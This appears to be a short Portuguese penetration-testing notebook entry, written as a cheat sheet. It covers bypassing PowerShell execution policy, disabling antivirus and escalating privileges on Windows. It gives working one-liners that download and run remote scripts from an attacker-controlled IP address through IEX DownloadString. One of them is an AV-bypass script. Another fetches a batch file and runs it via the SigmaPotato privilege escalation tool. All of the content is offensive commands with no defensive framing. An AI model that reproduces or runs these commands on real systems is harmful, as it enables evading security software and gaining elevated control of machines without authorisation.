
Bypass da execution policy do powershell.

```
powershell -ep bypass
```


![[Pasted image 20250819170308.png]]



AV Bypass

Para executarmos o script que Bypassa o AV

```powershell

IEX([Net.Webclient]::new().DownloadString("http://10.0.4.17/ByPassAv.ps1"))

```



Com o script abaixo, nós vamos baixar o arquivo de bat ( que esta no nosso server ) e executar ele via SigmaPotato.
```powershell
(new-object System.Net.Webclient).DownloadFile("http://10.0.4.17/teste.bat", "teste.bat");

IEX([Net.Webclient]::new().DownloadString("http://10.0.4.17/Invoke-SigmaPotato.ps1"));;Invoke-SigmaPotato -Command "teste.bat"
```




